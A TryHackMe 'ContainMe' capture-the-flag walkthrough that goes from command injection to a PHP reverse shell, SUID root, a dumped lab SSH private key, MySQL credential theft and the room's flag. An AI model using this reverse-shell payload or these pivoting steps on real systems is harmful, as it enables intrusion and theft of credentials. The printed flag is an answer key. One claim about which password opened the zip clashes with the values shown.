# <div align="center">[ContainMe - TryHackMe Walkthrough](https://tryhackme.com/room/containme1)</div>
<div align="center">Where am I ? Catch me</div>
<div align="center">
	<img width="200" height="200" alt="89eaf880161ad2a96f0a8000b5f9ab57" src="https://github.com/user-attachments/assets/a85556bf-b9b8-4945-b981-906a06d46840" />
</div>

## Task 1. Find the flag

```
No answer needed
```
## Task 2. Find the one and only flag

Good luck finding the flag!

### What is the flag?
```
THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}
```
## Introduction
ContainMe was a fun medium difficulty TryHackMe room focused around web exploitation, containerized environments, lateral movement, and internal enumeration. What initially looked like a simple web challenge slowly turned into a multi-stage pivot across different hosts inside the network.

In this walkthrough, I’ll cover the exact steps I followed to get initial access, escalate privileges inside the container, pivot into the internal host, and finally capture the root flag.

## Initial Access

I started the machine with a basic Nmap scan to identify the running services.

```bash
$ nmap -sV 10.49.172.109

PORT     STATE SERVICE       VERSION
22/tcp   open  tcpwrapped
80/tcp   open  tcpwrapped
2222/tcp open  EtherNetIP-1?
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
```

The scan showed four open ports:

* Port 22 running `tcpwrapped`
* Port 80 serving HTTP
* Port 2222 running `EtherNetIP`
* Port 8022 running SSH

Since HTTP was exposed on port 80, I started enumerating the web application first.

---

## Web Enumeration

I opened the target in the browser and was greeted with the default Apache page.

<img width="804" height="592" alt="image" src="https://github.com/user-attachments/assets/8b820332-a480-4ed5-adfe-35ec965281be" />

That usually means there could still be hidden files or directories behind the default landing page, so I started directory enumeration using Gobuster.

```bash
$ gobuster dir -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.49.172.109 -x md,js,html,php,py,css,txt,bak 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================

[+] Url:                     http://10.49.172.109
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,html,php,py,css,txt,bak,md
[+] Timeout:                 10s

===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 329]
/info.php             (Status: 200) [Size: 68943]
```

The `index.html` page only returned the default Apache page, but `index.php` and `info.php` looked more interesting.

The `info.php` page exposed the PHP configuration of the server.

<img width="964" height="919" alt="image" src="https://github.com/user-attachments/assets/3630d47c-2967-4fcc-b229-7ea0fea5a3ee" />

The more interesting finding was `index.php`. When I checked its contents directly using `curl`, it revealed the contents of the web root directory along with an unusual comment.

```bash
$ curl http://10.49.172.109/index.php

<html>
<body>
	<pre>
	total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

The output confirmed that the files inside the web root were owned by the `root` user. The comment at the bottom also looked intentional and hinted that there was still another path left to discover.

---
## Exploitation

The comment inside `index.php` hinted toward a hidden path parameter, so I started testing for Local File Inclusion behavior.

I added a `path` parameter to the request and pointed it to the root directory.

```bash id="d8jv9s"
$ curl http://10.49.172.109/index.php?path=/

<html>
<body>
	<pre>
	total 80K
drwxr-xr-x  22 root   root    4.0K Jul 15  2021 .
drwxr-xr-x  22 root   root    4.0K Jul 15  2021 ..
drwxr-xr-x   2 root   root    4.0K May 23 11:39 bin
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 boot
drwxr-xr-x   8 root   root     500 May 23 11:27 dev
drwxr-xr-x  81 root   root    4.0K May 23 11:40 etc
drwxr-xr-x   3 root   root    4.0K Jul 19  2021 home
drwxr-xr-x  16 root   root    4.0K Jun 29  2021 lib
drwxr-xr-x   2 root   root    4.0K Apr 27  2025 lib64
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 media
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 mnt
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 opt
dr-xr-xr-x 208 nobody nogroup    0 May 23 11:27 proc
drwx------   6 root   root    4.0K Jul 19  2021 root
drwxr-xr-x  17 root   root     700 May 23 11:41 run
drwxr-xr-x   2 root   root     12K May 23 11:38 sbin
drwxr-xr-x   2 root   root    4.0K Jul 14  2021 snap
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 srv
dr-xr-xr-x  13 nobody nogroup    0 May 23 11:27 sys
drwxrwxrwt   2 root   root    4.0K May 23 11:39 tmp
drwxr-xr-x  10 root   root    4.0K May 23 11:37 usr
drwxr-xr-x  14 root   root    4.0K Jul 15  2021 var
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

At this point, the vulnerability was confirmed. The application was taking user supplied input from the `path` parameter and exposing filesystem contents directly.

After a few payload attempts, I managed to get command execution using a PHP `proc_open` reverse shell.

```bash id="m1rj7u"
;php -r '$s=fsockopen("<IP>",<Port>);proc_open("sh",[$s,$s,$s],$p);'
```

Before sending the payload, I started a Netcat listener on my machine.

```bash id="s9zv2p"
$ nc -lvnp 1234
```

I injected the payload through the vulnerable parameter.

<img width="1318" height="151" alt="image" src="https://github.com/user-attachments/assets/e21a1e77-120d-43b9-917c-5eaa65e0b459" />

A few seconds later, the reverse shell connected back successfully.

<img width="486" height="90" alt="image" src="https://github.com/user-attachments/assets/905de5d4-51e5-4dd4-8a18-04f1ce0feffe" />

Once inside the machine, I upgraded the shell to make interaction more stable.

```bash id="u4qn8x"
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now I had a proper interactive shell and could continue enumerating the system further.

## Privilege Escalation Enumeration

After getting the reverse shell, I started enumerating the system manually to look for anything unusual.

I moved into Mike’s home directory and found a binary named `1cryptupx`.

```bash id="gq8v1m"
www-data@host1:/var/www/html$ cd /home/mike
www-data@host1:/home/mike$ ls

1cryptupx
```

I initially tried checking the binary using common utilities, but most of them were missing from the container.

```bash id="p8kz2n"
www-data@host1:/home/mike$ file 1cryptupx
bash: file: command not found

www-data@host1:/home/mike$ string 1cryptupx
bash: string: command not found
```

So I executed it directly to see what it did.

```bash id="r3mty9"
www-data@host1:/home/mike$ ./1cryptupx
```

```text
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
```

The binary only printed a banner and did not reveal much information.

At that point, I switched to checking for SUID binaries.

```bash id="j7xq4r"
www-data@host1:/home/mike$ find / -user root -perm /4000 2>/dev/null
```

```text
/usr/share/man/zh_TW/crypt
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/mount
/bin/ping
/bin/su
/bin/umount
/bin/fusermount
/bin/ping6
```

One file immediately stood out.

```text
/usr/share/man/zh_TW/crypt
```

That path looked unusual for a SUID binary, so I checked its permissions.

```bash id="t6nw5p"
www-data@host1:/home/mike$ ls -la /usr/share/man/zh_TW/crypt

-rwsr-xr-x 1 root root 358668 Jul 30  2021 /usr/share/man/zh_TW/crypt
```

The binary was owned by `root` and had the SUID bit enabled.

Before transferring it locally for analysis, I decided to interact with it directly using different arguments.

```bash id="c9qk2v"
www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt -h
```

```text
You wish!
```

Then I tried another argument.

```bash id="m4u8zr"
www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt -a
```

```text
Unable to decompress.
```

At this point, I started testing random inputs against the binary. Surprisingly, passing the username `mike` immediately dropped me into a root shell.

```bash id="x8bn6s"
www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt mike
```

```text
root@host1:/var/www/html# whoami
root
```

I finally had root access.

---

## Root Access

After getting the root shell, I moved into `/root` expecting to find the flag immediately.

```bash id="y5dv1q"
root@host1:/var/www/html# cd /root
root@host1:/root# ls
```

But there was no flag.

For a moment, it felt strange. Then the room name started making sense.

`ContainMe`

I checked the current user context.

```bash id="e2rh7k"
root@host1:/home/mike# id

uid=0(root) gid=33(www-data) groups=33(www-data)
```

Even though I had root privileges, the environment clearly looked restricted. That confirmed I was inside a container rather than the actual host machine.

To verify that theory, I checked the network interfaces.

```bash id="w3mj8p"
root@host1:/root# ifconfig
```

```text
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
```

The second interface confirmed there was another internal network reachable from the container.

At this stage, the objective shifted from container root access to pivoting deeper into the environment.

## Lateral Movement

At this point, I had root access inside the container, so I started looking for anything useful that could help me move further into the environment.

Inside Mike’s home directory, I found SSH keys stored under `.ssh`.

```bash id="n8f2qw"
root@host1:/root# cd /home/mike
root@host1:/home/mike# ls .ssh

id_rsa  id_rsa.pub
```

I dumped the private key.

```bash id="z3k7mv"
root@host1:/home/mike# cat .ssh/id_rsa
```

```text id="u7xq5d"
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAnWmOnLHQfBxrW0W0YuCiTuuGjCMUrISE4hdDMMuZruW6nj+z
YQCmjcL3T4j7v3/ddOBsTgxwi/+ZRZtRqJlvKEevPHJ8cR1DX7mmNyU3w/DRMnrW
djcIozYXVYdmj9v3e8xPbR6ybJX6fKpTuaDVdiwqQAecbvs5tBUkonAYUBuv1nhb
p/6+ZRYWNWv9RXE1XRuhROXD1Kl/tm7z4EcGZEDHu36oka23JJL7vzMeNtAdz3JF
wlGAtXH1cpdNa3+JKl/dBrRjV+YT3YivlqA2z4tRx/sA91RTxEO5oTYEL0bR1cKg
UPf1b21ecna8mpvQnkQmqQe8W9tSSlzVb6jnowIDAQABAoIBAA09O4liSy6lFUJv
8mP+kKgilwZiTPLVkneRjU0lUp+rIq78nJGkBF4X78T4uHO6xV13IqTN1wlvTezU
y2FqxjaVEN/8oQrCc1AxxREOSEpqjq24NyFqL4fKnNvMr4uZ7I60+FktI8SOOKsT
iEcsh8eQn10TRszuxEOpI5Ol6eWSzMPKxuw4ChniJsvaz8IDkYd4O/MDddjgcttb
Wv+LhX7qANPnRzeIDUNG2wmy3U+gxIJno/h3Xec0kVNQ0qwZmr56DO9G1oBbTU+4
6ynpIG2hEbSwGktWmnfw/4O+DZr8NiqeLY10G0MIwFIycuj2QfIF+mY6nqCZPWrH
8Lkf8wECgYEA0PMS/uqxL5u4e+bwSPdtfhEvFxk33/+PWMFIx0c5v7/jwtSW+/0v
YEIDC/DmHh9h4aF8dHMg8x18B50dw0HuLHWIgezNjJ9M8jwQgixRGamc5m6oFWh5
59581KWVIuDFqLG/6DN6cW/QQDo2MrNKP3QADeUPb2jhflzmir0TDLECgYEAwNud
VzZ6ON5YvbJbNh/JltSS1jAqUftzheX/m+3VrjE0iChLGvyP84aY7qpbiXNLHe+3
1/4JPoTljlml2RMTdZjAiF52u6KXwOLx6alGFoSbmAoZYG/4/Z0pwLjcozWGrjYD
03EDPdCclzWFyCqD9pYFGVAvEJuqx3rGYm1x/pMCgYEA0IdWFNwqOsYhBl6CvX9Z
YbBKm7XKQp2s9LnpJSAbLReXebBqgk+6gUk/+yHOto9BQ0nDiAACCT8KshqGQoDA
7tPZiTjIJqgwxatWGmOaCI9yi7IxwzPCPbqYQCyEOwuxl9rVGCqP7zfU0NSHlG/E
ELF3AGby0ZANQuv6FMn/gfECgYEAkjoyK31P4KyeBn8kb35coDNffm2YuP56Ei1Y
yMblPKVsWkyK3dRf5VrJvDSJIUe8zd8Duw6PvcqQL4XDnTq8h26hlQRi7FQU0hiB
KhTB4rL7MqV9pkRgOxOeI9VG3azpCFBGSFypA4aYJIJdhG7QDfijtxS4CtStAYES
yHCJfWcCgYAFzAx6hwi9smlvCpoZ1D8TRyqlxKf4YtSkTl74ZyiRESfvpuZSiclg
mFdVoHOt+gkpsXkmGmuqymIBRYGEw3dJ2C4MRPjx0UFpua0BAZ5k0ly6eaZuejWj
0/AHOf/jOfwvM4G2X0L8yjJqq/5F6NOjf9uxEusphzDcr/I1inuY3A==
-----END RSA PRIVATE KEY-----
```

Now that I had Mike’s SSH private key, I started looking for another reachable host inside the internal network.

Based on the network configuration discovered earlier, the second machine appeared to be reachable through the `172.16.20.0/24` subnet. After a bit of guessing and quick checking, I identified another host at `172.16.20.6`.

I used the private key to SSH into it.

```bash id="a2v4rx"
$ ssh mike@172.16.20.6 -i id_rsa
```

The login worked immediately.

```bash id="d7m8py"
root@host1:/home/mike/.ssh# ssh mike@172.16.20.6 -i id_rsa

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.15.0-139-generic x86_64)

Last login: Sat May 23 17:22:48 2026 from 172.16.20.2

mike@host2:~$ id

uid=1001(mike) gid=1001(mike) groups=1001(mike)
```

At this stage, I was finally inside `host2`.

After taking a short break because the room was already turning into a maze, I started enumerating services and listening ports on the new machine.

```bash id="f5k1zs"
mike@host2:~$ ss -tulnp
```

```text id="m0j4vq"
Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port   

udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:*      

tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*      

tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*      

tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*      

tcp    LISTEN   0        128                  [::]:22               [::]:*      
```

One thing immediately stood out.

Port `3306` was listening locally on `127.0.0.1`, which meant MySQL was running internally on the machine.

## Credential Discovery

Since MySQL was running locally on port `3306`, I tried authenticating with the current user account.

I used `mike` as the username and started trying a few simple passwords. Surprisingly, one of the guesses worked.

```bash id="q7m4vx"
mike@host2:~$ mysql -u mike -p

Enter password: password
```

Once inside the database, I started enumerating the available databases and tables.

```sql id="t5x9rb"
mysql> show databases;
```

```text id="k2q8wp"
+--------------------+
| Database           |
+--------------------+
| information_schema |
| accounts           |
+--------------------+
```

The `accounts` database immediately looked interesting.

```sql id="m3f6yu"
mysql> use accounts;
```

```sql id="d8n1kt"
mysql> show tables;
```

```text id="x0z5mq"
+--------------------+
| Tables_in_accounts |
+--------------------+
| users              |
+--------------------+
```

I dumped the contents of the `users` table.

```sql id="w6p2gh"
mysql> select * from users;
```

```text id="n4y7cb"
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | bjsig4868fgjjeog    |
| mike  | ca                  |
+-------+---------------------+
```

That finally gave me credentials for the root account.

---

## Root Access

I used the recovered password to switch to the root user.

```bash id="v8j3ms"
mike@host2:~$ su root

Password: bjsig4868fgjjeog
```

The password worked.

```bash id="y1r9kv"
root@host2:/home/mike# cd /root
root@host2:~# ls

mike.zip
```

At first, I expected the flag to be directly inside `/root`, but instead there was a ZIP archive named `mike.zip`.

I extracted it.

```bash id="c5u7xa"
root@host2:~# unzip mike.zip
```

```text id="r4z8pd"
Archive:  mike.zip
[mike.zip] mike password: WhatAreYouDoingHere

 extracting: mike
```

The archive requested Mike’s password, and the credentials recovered from the database worked successfully.

After extraction, a file named `mike` appeared inside the directory.

```bash id="b2n6qw"
root@host2:~# ls

mike  mike.zip
```

---

## Root Flag

Finally, I opened the file and grabbed the root flag.

```bash id="h9x4tj"
root@host2:~# cat mike

THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}
```

This room turned out to be far more interesting than I expected. What started as a simple web enumeration challenge slowly unfolded into container escape style pivoting, internal network discovery, SSH lateral movement, and credential hunting across multiple hosts.

<img width="857" height="399" alt="image" src="https://github.com/user-attachments/assets/5c00631f-7413-4a4c-81f0-b4158c4c0ce7" />
